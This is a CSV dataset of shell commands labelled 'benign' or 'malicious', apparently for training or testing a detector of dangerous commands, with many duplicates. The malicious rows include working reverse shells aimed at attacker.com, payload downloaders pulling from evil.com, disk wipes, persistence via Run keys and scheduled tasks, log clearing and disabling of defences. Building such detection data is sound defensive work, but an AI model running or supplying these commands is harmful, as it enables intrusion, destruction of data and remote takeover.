command,label
type ls 2>/dev/null,benign
net localgroup administrators hacker /add,malicious
iostat | head -5,benign
curl -I https://google.com,benign
chmod 777 /etc/shadow,malicious
find /home -name '*.txt',benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
systemctl reload nginx > output.txt,benign
apt list --installed,benign
wget http://malicious.com/malware.exe &,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ >/dev/null,malicious
whoami | head -5,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon 2>&1,malicious
diskpart select disk 0 clean &,malicious
sc stop Windows Defender,malicious
kubectl get pods | head -5,benign
iostat --help,benign
traceroute google.com,benign
ufw status,benign
nc -l -p 4444 -e /bin/bash,malicious
date > output.txt,benign
wc -l document.txt,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
format C: /q /x,malicious
rsync -av /src/ /dst/,benign
last,benign
wmic process call create 'cmd.exe /c powershell.exe' >/dev/null,malicious
(regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll),malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
mkfs.ext4 /dev/sda1,malicious
w,benign
du -sh /var/log --help,benign
chown user:group file.txt,benign
echo 'virus' > /etc/passwd 2>&1,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
service apache2 status,benign
usermod -aG sudo user,benign
ncat -lvp 443 -e cmd.exe,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1 2>&1,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1 >/dev/null,malicious
mkdir -p /tmp/test,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
uptime,benign
scp file.txt user@server:/path/,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
docker images > output.txt,benign
nohup schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
crontab -l,benign
mount,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")' 2>&1",malicious
diskpart select disk 0 clean >/dev/null,malicious
dd if=/dev/zero of=/dev/sda,malicious
passwd user,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
ss -tulpn,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
docker images,benign
npm list,benign
cat /dev/urandom > /dev/sda,malicious
diskpart select disk 0 clean,malicious
wget http://malicious.com/malware.exe,malicious
id user,benign
nohup python -m http.server 8080,malicious
docker images,benign
timeout 60 netsh advfirewall set allprofiles state off,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
ssh user@server.com,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures >/dev/null,malicious
"timeout 60 ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
cat /etc/passwd,benign
mshta javascript:alert('code execution'),malicious
sudo rsync -av /src/ /dst/,benign
attrib +h +s malware.exe,malicious
wget http://malicious.com/malware.exe,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
cat /dev/urandom > /dev/sda,malicious
ncat -lvp 443 -e cmd.exe,malicious
type ls,benign
python --version 2>/dev/null,benign
vssadmin delete shadows /all /quiet,malicious
iostat,benign
git clone https://github.com/user/repo.git,benign
taskkill /f /im antimalware.exe,malicious
mkfs.ext4 /dev/sda1,malicious
netstat -tulpn,benign
cmd /c del /q /s C:\*,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') 2>&1",malicious
python -m http.server 8080 2>&1,malicious
timeout 60 cat /dev/urandom > /dev/sda,malicious
apt list --installed,benign
cmd /c del /q /s C:\* >/dev/null,malicious
netsh advfirewall set allprofiles state off,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1 &,malicious
scp file.txt user@server:/path/,benign
cmd /c del /q /s C:\*,malicious
passwd user,benign
mshta javascript:alert('code execution'),malicious
date,benign
cmd /c del /q /s C:\*,malicious
mkfs.ext4 /dev/sda1,malicious
scp file.txt user@server:/path/,benign
pwd,benign
chown user:group file.txt > output.txt,benign
systemctl reload nginx,benign
:(){ :|:& };: 2>&1,malicious
rm -rf /,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
echo 'Hello World',benign
ufw status,benign
uptime,benign
uniq sorted.txt,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
net user hacker password123 /add,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
nc -l -p 4444 -e /bin/bash,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
rsync -av /src/ /dst/ 2>/dev/null,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
htop,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
useradd newuser -v,benign
cmd /c del /q /s C:\*,malicious
whoami,benign
shutdown /r /f /t 0,malicious
:(){ :|:& };:,malicious
cmd /c del /q /s C:\*,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
man ls,benign
rsync -av /src/ /dst/ --help,benign
ping -c 4 google.com,benign
ufw status,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll &,malicious
groups user 2>/dev/null,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
grep pattern file.txt,benign
nslookup google.com,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
who,benign
crontab -l,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
nc -l -p 4444 -e /bin/bash,malicious
ss -tulpn,benign
netsh advfirewall set allprofiles state off 2>&1,malicious
echo 'virus' > /etc/passwd,malicious
nohup wevtutil cl System,malicious
mkdir -p /tmp/test > output.txt,benign
tail -f /var/log/syslog,benign
wevtutil cl Security,malicious
net user hacker password123 /add,malicious
systemctl status nginx,benign
netsh advfirewall set allprofiles state off,malicious
net user hacker password123 /add,malicious
(sc stop Windows Defender),malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
history -v,benign
traceroute google.com,benign
fdisk -l,benign
"nohup socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
shutdown /r /f /t 0 2>&1,malicious
ssh user@server.com,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
mshta javascript:alert('code execution'),malicious
free -m,benign
service apache2 status,benign
wget http://malicious.com/malware.exe,malicious
lsblk,benign
mv old.txt new.txt,benign
usermod -aG sudo user --help,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' &",malicious
cmd /c del /q /s C:\*,malicious
wevtutil cl Security,malicious
iptables -L,benign
sdelete -p 10 -s -z C:\,malicious
"(rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS'))",malicious
pwd 2>/dev/null,benign
attrib +h +s malware.exe,malicious
pip list 2>/dev/null,benign
df -h,benign
sudo ssh user@server.com,benign
mshta javascript:alert('code execution') 2>&1,malicious
netstat -tulpn,benign
last,benign
shutdown /r /f /t 0,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
taskkill /f /im antimalware.exe,malicious
wget http://malicious.com/malware.exe,malicious
cmd /c del /q /s C:\*,malicious
dd if=/dev/zero of=/dev/sda,malicious
kubectl get pods --help,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
sdelete -p 10 -s -z C:\,malicious
timeout 60 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
nohup wget http://malicious.com/malware.exe,malicious
python -m http.server 8080,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
python --version,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
fdisk -l,benign
sudo who,benign
cat /etc/passwd,benign
useradd newuser,benign
(bash -i >& /dev/tcp/attacker.com/443 0>&1),malicious
wc -l document.txt 2>/dev/null,benign
nslookup google.com | head -5,benign
ufw status,benign
sudo uptime,benign
kubectl get pods > output.txt,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")' >/dev/null",malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
rsync -av /src/ /dst/,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
pwd,benign
uniq sorted.txt,benign
which python,benign
chmod 777 /etc/shadow,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
npm list,benign
cmd /c del /q /s C:\*,malicious
sc stop Windows Defender,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
netsh advfirewall set allprofiles state off,malicious
iostat | head -5,benign
git pull origin main,benign
userdel olduser,benign
timeout 60 certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
ls -la,benign
uniq sorted.txt,benign
git pull origin main,benign
ps aux,benign
touch newfile.txt,benign
umount /dev/sdb1,benign
ufw status,benign
npm list,benign
date -v,benign
"cut -d',' -f1 data.csv",benign
who,benign
uptime,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
sed 's/old/new/g' file.txt,benign
mkdir -p /tmp/test,benign
:(){ :|:& };:,malicious
diskpart select disk 0 clean,malicious
ls -la 2>/dev/null,benign
last,benign
mkfs.ext4 /dev/sda1 &,malicious
ping -c 4 google.com 2>/dev/null,benign
format C: /q /x,malicious
history,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
find /home -name '*.txt',benign
timeout 60 bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
tail -f /var/log/syslog,benign
python -m http.server 8080 2>&1,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
free -m,benign
which python,benign
mkfs.ext4 /dev/sda1,malicious
cat /dev/urandom > /dev/sda,malicious
ping -c 4 google.com,benign
git pull origin main,benign
docker ps,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll &,malicious
sort data.txt,benign
dd if=/dev/zero of=/dev/sda,malicious
timeout 60 regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
traceroute google.com,benign
awk '{print $1}' data.txt,benign
cp file1.txt file2.txt,benign
ping -c 4 google.com,benign
nohup cat /dev/urandom > /dev/sda,malicious
net user hacker password123 /add,malicious
cat /etc/passwd,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
attrib +h +s malware.exe >/dev/null,malicious
iostat -v,benign
sort data.txt,benign
python --version,benign
mount,benign
vmstat --help,benign
npm list,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
chmod 777 /etc/shadow,malicious
wget https://example.com/file.txt,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
du -sh /var/log,benign
wevtutil cl Security,malicious
traceroute google.com,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
mkfs.ext4 /dev/sda1,malicious
head -10 logfile.txt,benign
wmic process call create 'cmd.exe /c powershell.exe' >/dev/null,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
mshta javascript:alert('code execution') &,malicious
taskkill /f /im antimalware.exe &,malicious
python -m http.server 8080,malicious
npm list,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
:(){ :|:& };: >/dev/null,malicious
head -10 logfile.txt > output.txt,benign
curl -I https://google.com,benign
umount /dev/sdb1,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
apt list --installed,benign
wget https://example.com/file.txt,benign
ufw status -v,benign
:(){ :|:& };:,malicious
mkfs.ext4 /dev/sda1,malicious
w,benign
traceroute google.com,benign
id user,benign
vmstat,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures >/dev/null,malicious
htop -v,benign
wc -l document.txt,benign
free -m,benign
curl http://evil.com/payload.sh | bash,malicious
usermod -aG sudo user | head -5,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
attrib +h +s malware.exe >/dev/null,malicious
mshta javascript:alert('code execution') 2>&1,malicious
top,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
chown user:group file.txt,benign
sed 's/old/new/g' file.txt,benign
echo 'virus' > /etc/passwd,malicious
awk '{print $1}' data.txt --help,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
sc stop Windows Defender,malicious
cat /dev/urandom > /dev/sda,malicious
traceroute google.com,benign
nohup rm -rf /,malicious
last,benign
chmod 777 /etc/shadow,malicious
timeout 60 cmd /c del /q /s C:\*,malicious
net user hacker password123 /add,malicious
netsh advfirewall set allprofiles state off,malicious
nslookup google.com,benign
ssh user@server.com,benign
timeout 60 taskkill /f /im antimalware.exe,malicious
whoami > output.txt,benign
usermod -aG sudo user | head -5,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
taskkill /f /im antimalware.exe >/dev/null,malicious
mv old.txt new.txt,benign
nohup diskpart select disk 0 clean,malicious
attrib +h +s malware.exe,malicious
finger user,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
echo 'virus' > /etc/passwd,malicious
tail -f /var/log/syslog 2>/dev/null,benign
timeout 60 wmic process call create 'cmd.exe /c powershell.exe',malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' &",malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
history,benign
taskkill /f /im antimalware.exe,malicious
wevtutil cl Security 2>&1,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
lsblk,benign
attrib +h +s malware.exe,malicious
ncat -lvp 443 -e cmd.exe,malicious
format C: /q /x,malicious
iptables -L,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
find /home -name '*.txt',benign
du -sh /var/log,benign
tar -czf backup.tar.gz /data,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
sort data.txt,benign
tail -f /var/log/syslog | head -5,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
which python,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon &,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
passwd user -v,benign
cat /dev/urandom > /dev/sda &,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
wevtutil cl Security,malicious
rsync -av /src/ /dst/,benign
shutdown /r /f /t 0 2>&1,malicious
mount,benign
wevtutil cl System,malicious
usermod -aG sudo user 2>/dev/null,benign
wget http://malicious.com/malware.exe,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
userdel olduser,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') &",malicious
apt list --installed,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
sudo kubectl get pods,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
systemctl status nginx,benign
mshta javascript:alert('code execution') &,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
timeout 60 dd if=/dev/zero of=/dev/sda,malicious
timeout 60 net user hacker password123 /add,malicious
sudo userdel olduser,benign
top,benign
nslookup google.com,benign
attrib +h +s malware.exe &,malicious
usermod -aG sudo user,benign
wget http://malicious.com/malware.exe,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
timeout 60 sdelete -p 10 -s -z C:\,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
wget http://malicious.com/malware.exe,malicious
rsync -av /src/ /dst/,benign
sudo wc -l document.txt,benign
python -m http.server 8080,malicious
tar -czf backup.tar.gz /data | head -5,benign
(ncat -lvp 443 -e cmd.exe),malicious
cmd /c del /q /s C:\*,malicious
sudo cp file1.txt file2.txt,benign
timeout 60 curl http://evil.com/payload.sh | bash,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
git pull origin main,benign
nslookup google.com -v,benign
node --version,benign
traceroute google.com,benign
ss -tulpn,benign
pwd,benign
fdisk -l | head -5,benign
mshta javascript:alert('code execution') 2>&1,malicious
:(){ :|:& };: >/dev/null,malicious
dd if=/dev/zero of=/dev/sda,malicious
touch newfile.txt,benign
awk '{print $1}' data.txt > output.txt,benign
rm -rf /,malicious
cipher /w:C:\,malicious
python --version --help,benign
last -v,benign
curl -I https://google.com,benign
nohup net localgroup administrators hacker /add,malicious
tar -czf backup.tar.gz /data,benign
java -version,benign
sed 's/old/new/g' file.txt,benign
rsync -av /src/ /dst/,benign
systemctl reload nginx,benign
cat /dev/urandom > /dev/sda,malicious
nslookup google.com,benign
net localgroup administrators hacker /add 2>&1,malicious
passwd user,benign
python -m http.server 8080 &,malicious
timeout 60 powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
tail -f /var/log/syslog,benign
apt list --installed --help,benign
umount /dev/sdb1 2>/dev/null,benign
lsblk,benign
wevtutil cl Security,malicious
touch newfile.txt,benign
format C: /q /x,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null 2>&1",malicious
nslookup google.com,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
sed 's/old/new/g' file.txt,benign
w 2>/dev/null,benign
echo 'virus' > /etc/passwd,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
find /home -name '*.txt',benign
shutdown /r /f /t 0 2>&1,malicious
ls -la,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")' >/dev/null",malicious
mv old.txt new.txt,benign
net user hacker password123 /add,malicious
head -10 logfile.txt 2>/dev/null,benign
lsblk | head -5,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
curl -I https://google.com,benign
passwd user --help,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
format C: /q /x,malicious
python -m http.server 8080 &,malicious
sdelete -p 10 -s -z C:\,malicious
ufw status,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
nslookup google.com --help,benign
(:(){ :|:& };:),malicious
yum list installed,benign
usermod -aG sudo user,benign
net user hacker password123 /add,malicious
history,benign
systemctl status nginx,benign
chmod 755 script.sh 2>/dev/null,benign
wget http://malicious.com/malware.exe,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
umount /dev/sdb1,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
whoami,benign
service apache2 status,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
timeout 60 rm -rf /,malicious
npm list,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")' 2>&1",malicious
pwd,benign
ls -la 2>/dev/null,benign
mkfs.ext4 /dev/sda1 2>&1,malicious
apt list --installed,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
nohup cipher /w:C:\,malicious
java -version,benign
w,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') >/dev/null",malicious
ls -la,benign
systemctl status nginx | head -5,benign
(ncat -lvp 443 -e cmd.exe),malicious
htop,benign
ps aux,benign
wget https://example.com/file.txt,benign
uniq sorted.txt 2>/dev/null,benign
free -m,benign
(rm -rf /),malicious
git pull origin main,benign
diskpart select disk 0 clean,malicious
chmod 777 /etc/shadow,malicious
groups user,benign
"(ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)')",malicious
timeout 60 net localgroup administrators hacker /add,malicious
which python,benign
scp file.txt user@server:/path/ | head -5,benign
npm list,benign
wevtutil cl Security,malicious
uniq sorted.txt --help,benign
history | head -5,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts &,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
vssadmin delete shadows /all /quiet,malicious
rm -rf /,malicious
(certutil -urlcache -split -f http://evil.com/malware.exe malware.exe),malicious
nc -l -p 4444 -e /bin/bash,malicious
echo 'Hello World',benign
mv old.txt new.txt 2>/dev/null,benign
"nohup python -c 'import os; os.system(""rm -rf /"")'",malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
echo 'virus' > /etc/passwd 2>&1,malicious
rmdir empty_folder > output.txt,benign
service apache2 status,benign
apt list --installed,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ &,malicious
"(awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null)",malicious
systemctl status nginx -v,benign
chown user:group file.txt,benign
wget https://example.com/file.txt --help,benign
sudo ssh user@server.com,benign
wevtutil cl Security,malicious
timeout 60 cmd /c del /q /s C:\*,malicious
diskpart select disk 0 clean,malicious
top,benign
yum list installed,benign
date,benign
format C: /q /x >/dev/null,malicious
sc stop Windows Defender >/dev/null,malicious
cipher /w:C:\ 2>&1,malicious
groups user,benign
ls -la,benign
(nc -l -p 4444 -e /bin/bash),malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
uniq sorted.txt,benign
wevtutil cl System,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
ncat -lvp 443 -e cmd.exe,malicious
umount /dev/sdb1,benign
touch newfile.txt,benign
pwd,benign
git clone https://github.com/user/repo.git,benign
pip list,benign
chmod 755 script.sh,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
timeout 60 bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
ps aux,benign
who > output.txt,benign
uptime,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
type ls,benign
timeout 60 net localgroup administrators hacker /add,malicious
rm -rf /,malicious
id user,benign
attrib +h +s malware.exe,malicious
mshta javascript:alert('code execution') 2>&1,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
fdisk -l,benign
